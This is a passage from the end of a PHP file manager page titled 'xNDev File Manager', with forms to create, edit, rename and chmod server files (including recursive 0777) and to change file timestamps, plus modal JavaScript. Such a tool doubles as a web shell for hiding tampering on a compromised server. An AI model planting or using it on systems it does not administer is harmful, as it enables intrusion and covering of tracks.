            <textarea name="newFileContent" rows="6" placeholder="Initial file content (optional)..." class="input-text" style="margin-bottom:8px;"></textarea>
        </div>
        <button type="submit" class="btn">Create File</button>
    </form>
</div>
<?php endif; ?>

<?php if (isset($_GET['newfolder'])): ?>
<div class="panel">
    <div class="panel-head">
        <span class="panel-title">Create New Folder</span>
        <a href="<?php echo $actionUrl; ?>" class="panel-close">[ Close ]</a>
    </div>
    <form action="<?php echo $actionUrl; ?>" method="post" style="display:flex; gap:8px;">
        <input type="text" name="newFolderName" placeholder="folder-name" class="input-text" style="max-width:300px;" required autofocus>
        <button type="submit" class="btn">Create Folder</button>
    </form>
</div>
<?php endif; ?>

<?php if (isset($_GET['chmod'])):
    $chmItem = realpath($directory . '/' . $_GET['chmod']);
    if ($chmItem !== false && file_exists($chmItem)):
        $currPerm = fmtPerms($chmItem);
        $isItemDir = is_dir($chmItem);
?>
<div class="panel">
    <div class="panel-head">
        <span class="panel-title">Change Permissions (chmod): <?php echo htmlspecialchars(basename($_GET['chmod'])); ?></span>
        <a href="<?php echo $actionUrl; ?>" class="panel-close">[ Close ]</a>
    </div>
    <form action="<?php echo $actionUrl; ?>" method="post">
        <input type="hidden" name="itemToChmod" value="<?php echo htmlspecialchars($_GET['chmod']); ?>">
        <div style="display:flex; align-items:center; gap:8px; margin-bottom:10px; flex-wrap:wrap;">
            <input type="text" name="newPerms" value="<?php echo $currPerm; ?>" class="input-text" style="width:110px;" maxlength="4" autofocus>
            <button type="submit" class="btn">Apply Permissions</button>
        </div>
        <div class="preset-group" style="margin-bottom:10px;">
            <a href="javascript:void(0)" class="preset-btn" onclick="document.getElementsByName('newPerms')[0].value='0644'">0644 (File)</a>
            <a href="javascript:void(0)" class="preset-btn" onclick="document.getElementsByName('newPerms')[0].value='0755'">0755 (Exec/Dir)</a>
            <a href="javascript:void(0)" class="preset-btn" onclick="document.getElementsByName('newPerms')[0].value='0777'">0777 (Full)</a>
            <a href="javascript:void(0)" class="preset-btn" onclick="document.getElementsByName('newPerms')[0].value='0600'">0600 (Private)</a>
            <a href="javascript:void(0)" class="preset-btn" onclick="document.getElementsByName('newPerms')[0].value='0400'">0400 (Read-only)</a>
        </div>
        <?php if ($isItemDir): ?>
        <label style="font-size:12px; cursor:pointer; display:inline-flex; align-items:center; gap:6px;">
            <input type="checkbox" name="recursiveChmod" value="1"> Apply recursively to all contents
        </label>
        <?php endif; ?>
    </form>
</div>
<?php endif; endif; ?>

<?php if (isset($_GET['rename'])):
    $renItem = $directory . '/' . basename($_GET['rename']);
    if (file_exists($renItem)):
?>
<div class="panel">
    <div class="panel-head">
        <span class="panel-title">Rename: <?php echo htmlspecialchars(basename($_GET['rename'])); ?></span>
        <a href="<?php echo $actionUrl; ?>" class="panel-close">[ Close ]</a>
    </div>
    <form action="<?php echo $actionUrl; ?>" method="post" style="display:flex; gap:8px; flex-wrap:wrap;">
        <input type="hidden" name="oldName" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
        <input type="text" name="newName" value="<?php echo htmlspecialchars(basename($_GET['rename'])); ?>" class="input-text" style="max-width:320px;" autofocus>
        <button type="submit" class="btn">Rename</button>
    </form>
</div>
<?php endif; endif; ?>

<?php if (isset($_GET['touch'])):
    $tchItem = realpath($directory . '/' . $_GET['touch']);
    if ($tchItem !== false && file_exists($tchItem)):
        $currTime = date('Y-m-d H:i:s', filemtime($tchItem));
?>
<div class="panel">
    <div class="panel-head">
        <span class="panel-title">Change Date: <?php echo htmlspecialchars(basename($_GET['touch'])); ?></span>
        <a href="<?php echo $actionUrl; ?>" class="panel-close">[ Close ]</a>
    </div>
    <form action="<?php echo $actionUrl; ?>" method="post" style="display:flex; gap:8px; flex-wrap:wrap;">
        <input type="text" name="updateTime" value="<?php echo $currTime; ?>" class="input-text" style="max-width:240px;" autofocus>
        <input type="hidden" name="itemToUpdate" value="<?php echo htmlspecialchars($_GET['touch']); ?>">
        <button type="submit" class="btn">Update Date</button>
    </form>
</div>
<?php endif; endif; ?>

<?php if (isset($_GET['edit'])):
    $editFile = realpath($directory . '/' . $_GET['edit']);
    if ($editFile !== false && is_file($editFile)):
        $editContent = file_get_contents($editFile);
?>
<div class="panel">
    <div class="panel-head">
        <span class="panel-title">Edit File: <?php echo htmlspecialchars(basename($_GET['edit'])); ?></span>
        <a href="<?php echo $actionUrl; ?>" class="panel-close">[ Close ]</a>
    </div>
    <form action="<?php echo $actionUrl; ?>" method="post">
        <textarea name="fileContent" rows="22" class="input-text" style="width:100%; margin-bottom:10px;"><?php echo htmlspecialchars($editContent); ?></textarea>
        <input type="hidden" name="fileName" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
        <button type="submit" class="btn">Save Changes</button>
    </form>
</div>
<?php endif; endif; ?>

<div id="modal_overlay" class="modal-backdrop" style="display:none;" onclick="handleBackdropClick(event);">

    <!-- Create File Modal -->
    <div id="modal_create_file" class="modal-box" style="display:none;">
        <div class="modal-head">
            <span class="modal-title">&#43; Create New File</span>
            <button type="button" class="modal-close" onclick="closeModals()">&times;</button>
        </div>
        <form action="<?php echo $actionUrl; ?>" method="post">
            <div class="modal-body">
                <div class="modal-target-info">
                    Directory: <strong><?php echo htmlspecialchars($directory); ?></strong>
                </div>
                <div class="form-group">
                    <label class="form-label" for="new_file_input">File Name:</label>
                    <input type="text" name="newFileName" id="new_file_input" class="input-text" placeholder="e.g. index.php, config.json, note.txt" autocapitalize="none" autocomplete="off" spellcheck="false" required>
                </div>
                <div class="form-group">
                    <label class="form-label" for="new_file_content">Initial Content (Optional):</label>
                    <textarea name="newFileContent" id="new_file_content" rows="6" class="input-text" placeholder="Leave empty for blank file..."></textarea>
                </div>
            </div>
            <div class="modal-foot">
                <button type="button" class="btn-sub" onclick="closeModals()">Cancel</button>
                <button type="submit" class="btn">Create File</button>
            </div>
        </form>
    </div>

    <!-- Create Folder Modal -->
    <div id="modal_create_folder" class="modal-box" style="display:none;">
        <div class="modal-head">
            <span class="modal-title">&#43; Create New Folder</span>
            <button type="button" class="modal-close" onclick="closeModals()">&times;</button>
        </div>
        <form action="<?php echo $actionUrl; ?>" method="post">
            <div class="modal-body">
                <div class="modal-target-info">
                    Directory: <strong><?php echo htmlspecialchars($directory); ?></strong>
                </div>
                <div class="form-group">
                    <label class="form-label" for="new_folder_input">Folder Name:</label>
                    <input type="text" name="newFolderName" id="new_folder_input" class="input-text" placeholder="e.g. assets, uploads, backup" autocapitalize="none" autocomplete="off" spellcheck="false" required>
                </div>
            </div>
            <div class="modal-foot">
                <button type="button" class="btn-sub" onclick="closeModals()">Cancel</button>
                <button type="submit" class="btn">Create Folder</button>
            </div>
        </form>
    </div>

    <!-- Chmod Modal -->
    <div id="modal_chmod" class="modal-box" style="display:none;">
        <div class="modal-head">
            <span class="modal-title">Change Permissions (chmod)</span>
            <button type="button" class="modal-close" onclick="closeModals()">&times;</button>
        </div>
        <form action="<?php echo $actionUrl; ?>" method="post">
            <div class="modal-body">
                <div class="modal-target-info">
                    Target: <strong id="chmod_modal_filename"></strong>
                </div>
                <input type="hidden" name="itemToChmod" id="chmod_modal_item" value="">

                <div class="form-group">
                    <label class="form-label" for="chmod_modal_perms">Octal Permission:</label>
                    <div style="display:flex; gap:10px; align-items:center;">
                        <input type="text" name="newPerms" id="chmod_modal_perms" class="input-text" style="width:110px; font-size:16px; font-weight:700; text-align:center;" maxlength="4" oninput="onPermsInputChanged(this.value)">
                        <span style="font-size:11px; color:var(--text-muted);">e.g. 0755, 0644, 0777</span>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Presets:</label>
                    <div class="preset-group">
                        <button type="button" class="preset-btn" onclick="applyPermPreset('0644')">0644 (File)</button>
                        <button type="button" class="preset-btn" onclick="applyPermPreset('0755')">0755 (Exec/Dir)</button>
                        <button type="button" class="preset-btn" onclick="applyPermPreset('0777')">0777 (Full)</button>
                        <button type="button" class="preset-btn" onclick="applyPermPreset('0600')">0600 (Private)</button>
                        <button type="button" class="preset-btn" onclick="applyPermPreset('0400')">0400 (Read-only)</button>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Permission Matrix:</label>
                    <table class="matrix-table">
                        <thead>
                            <tr>
                                <th>Class</th>
                                <th>Read (4)</th>
                                <th>Write (2)</th>
                                <th>Execute (1)</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>Owner</td>
                                <td><input type="checkbox" id="perm_u_r" onchange="updatePermsFromCheckboxes()"></td>
                                <td><input type="checkbox" id="perm_u_w" onchange="updatePermsFromCheckboxes()"></td>
                                <td><input type="checkbox" id="perm_u_x" onchange="updatePermsFromCheckboxes()"></td>
                            </tr>
                            <tr>
                                <td>Group</td>
                                <td><input type="checkbox" id="perm_g_r" onchange="updatePermsFromCheckboxes()"></td>
                                <td><input type="checkbox" id="perm_g_w" onchange="updatePermsFromCheckboxes()"></td>
                                <td><input type="checkbox" id="perm_g_x" onchange="updatePermsFromCheckboxes()"></td>
                            </tr>
                            <tr>
                                <td>Others</td>
                                <td><input type="checkbox" id="perm_o_r" onchange="updatePermsFromCheckboxes()"></td>
                                <td><input type="checkbox" id="perm_o_w" onchange="updatePermsFromCheckboxes()"></td>
                                <td><input type="checkbox" id="perm_o_x" onchange="updatePermsFromCheckboxes()"></td>
                            </tr>
                        </tbody>
                    </table>
                </div>

                <div class="form-group" id="chmod_recursive_wrap" style="display:none;">
                    <label style="cursor:pointer; display:inline-flex; align-items:center; gap:6px; font-size:12px; color:var(--text);">
                        <input type="checkbox" name="recursiveChmod" value="1"> Apply recursively to all contents
                    </label>
                </div>
            </div>
            <div class="modal-foot">
                <button type="button" class="btn-sub" onclick="closeModals()">Cancel</button>
                <button type="submit" class="btn">Save Permissions</button>
            </div>
        </form>
    </div>

    <!-- Rename Modal -->
    <div id="modal_rename" class="modal-box" style="display:none;">
        <div class="modal-head">
            <span class="modal-title">Rename Item</span>
            <button type="button" class="modal-close" onclick="closeModals()">&times;</button>
        </div>
        <form action="<?php echo $actionUrl; ?>" method="post">
            <div class="modal-body">
                <div class="modal-target-info">
                    Current Name: <strong id="rename_modal_current"></strong>
                </div>
                <input type="hidden" name="oldName" id="rename_modal_old" value="">
                <div class="form-group">
                    <label class="form-label" for="rename_modal_new">New Name:</label>
                    <input type="text" name="newName" id="rename_modal_new" class="input-text" autocapitalize="none" autocomplete="off" spellcheck="false" required>
                </div>
            </div>
            <div class="modal-foot">
                <button type="button" class="btn-sub" onclick="closeModals()">Cancel</button>
                <button type="submit" class="btn">Rename</button>
            </div>
        </form>
    </div>

    <!-- Touch Modal -->
    <div id="modal_touch" class="modal-box" style="display:none;">
        <div class="modal-head">
            <span class="modal-title">Change Timestamp (Touch)</span>
            <button type="button" class="modal-close" onclick="closeModals()">&times;</button>
        </div>
        <form action="<?php echo $actionUrl; ?>" method="post">
            <div class="modal-body">
                <div class="modal-target-info">
                    Target: <strong id="touch_modal_filename"></strong>
                </div>
                <input type="hidden" name="itemToUpdate" id="touch_modal_item" value="">
                <div class="form-group">
                    <label class="form-label" for="touch_modal_time">Timestamp (YYYY-MM-DD HH:MM:SS):</label>
                    <input type="text" name="updateTime" id="touch_modal_time" class="input-text" required>
                </div>
                <div class="preset-group">
                    <button type="button" class="preset-btn" onclick="setTouchNow()">Set to Current Time</button>
                </div>
            </div>
            <div class="modal-foot">
                <button type="button" class="btn-sub" onclick="closeModals()">Cancel</button>
                <button type="submit" class="btn">Update Date</button>
            </div>
        </form>
    </div>

</div>

<div class="footer">xNDev File Manager</div>

<script>
function showModal(id) {
    document.getElementById('modal_overlay').style.display = 'flex';
    var boxes = document.querySelectorAll('.modal-box');
    for (var i = 0; i < boxes.length; i++) {
        boxes[i].style.display = 'none';
    }
    var target = document.getElementById(id);
    if (target) {
        target.style.display = 'block';
        var autoInput = target.querySelector('input[type="text"]:not([readonly]), textarea');
        if (autoInput) {
            setTimeout(function() { autoInput.focus(); }, 60);
        }
    }
}

function closeModals() {
    document.getElementById('modal_overlay').style.display = 'none';
    var boxes = document.querySelectorAll('.modal-box');
    for (var i = 0; i < boxes.length; i++) {
        boxes[i].style.display = 'none';
    }
}

function handleBackdropClick(e) {
    if (e.target === document.getElementById('modal_overlay')) {
        closeModals();
    }
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' || e.keyCode === 27) {
        closeModals();
    }
});

function openCreateFileModal() {
    document.getElementById('new_file_input').value = '';
    document.getElementById('new_file_content').value = '';
    showModal('modal_create_file');
}

function openCreateFolderModal() {
    document.getElementById('new_folder_input').value = '';
    showModal('modal_create_folder');
}

function openRenameModal(item) {
    document.getElementById('rename_modal_current').textContent = item;
    document.getElementById('rename_modal_old').value = item;
    document.getElementById('rename_modal_new').value = item;
    showModal('modal_rename');
}

function openTouchModal(item, currentTime) {
    document.getElementById('touch_modal_filename').textContent = item;
    document.getElementById('touch_modal_item').value = item;
    document.getElementById('touch_modal_time').value = currentTime;
    showModal('modal_touch');
}

function setTouchNow() {
    var d = new Date();
    var pad = function(n) { return (n < 10 ? '0' : '') + n; };
    var nowStr = d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' +
                 pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
    document.getElementById('touch_modal_time').value = nowStr;
}

function onPermsInputChanged(val) {
    val = val.trim();
    if (/^0?[0-7]{3}$/.test(val)) {
        var clean = val.length === 4 ? val.substring(1) : val;
        var u = parseInt(clean.charAt(0), 10);
        var g = parseInt(clean.charAt(1), 10);
        var o = parseInt(clean.charAt(2), 10);

        document.getElementById('perm_u_r').checked = !!(u & 4);
        document.getElementById('perm_u_w').checked = !!(u & 2);
        document.getElementById('perm_u_x').checked = !!(u & 1);

        document.getElementById('perm_g_r').checked = !!(g & 4);
        document.getElementById('perm_g_w').checked = !!(g & 2);
        document.getElementById('perm_g_x').checked = !!(g & 1);

        document.getElementById('perm_o_r').checked = !!(o & 4);
        document.getElementById('perm_o_w').checked = !!(o & 2);
        document.getElementById('perm_o_x').checked = !!(o & 1);
    }
}

function updatePermsFromCheckboxes() {
    var u = (document.getElementById('perm_u_r').checked ? 4 : 0) +
            (document.getElementById('perm_u_w').checked ? 2 : 0) +
            (document.getElementById('perm_u_x').checked ? 1 : 0);

    var g = (document.getElementById('perm_g_r').checked ? 4 : 0) +
            (document.getElementById('perm_g_w').checked ? 2 : 0) +
            (document.getElementById('perm_g_x').checked ? 1 : 0);

    var o = (document.getElementById('perm_o_r').checked ? 4 : 0) +
            (document.getElementById('perm_o_w').checked ? 2 : 0) +
            (document.getElementById('perm_o_x').checked ? 1 : 0);

    var octal = '0' + u + '' + g + '' + o;
    document.getElementById('chmod_modal_perms').value = octal;
}

function applyPermPreset(val) {
    document.getElementById('chmod_modal_perms').value = val;
    onPermsInputChanged(val);
}

function openChmodModal(item, currentPerms, isDir) {
    document.getElementById('chmod_modal_filename').textContent = item;
    document.getElementById('chmod_modal_item').value = item;
    var perms = currentPerms || '0755';
    document.getElementById('chmod_modal_perms').value = perms;
    onPermsInputChanged(perms);

    var recWrap = document.getElementById('chmod_recursive_wrap');
    if (recWrap) {
        recWrap.style.display = isDir ? 'block' : 'none';
        var recBox = recWrap.querySelector('input[type="checkbox"]');
        if (recBox) { recBox.checked = false; }
    }
    showModal('modal_chmod');
}
</script>

</body>
</html>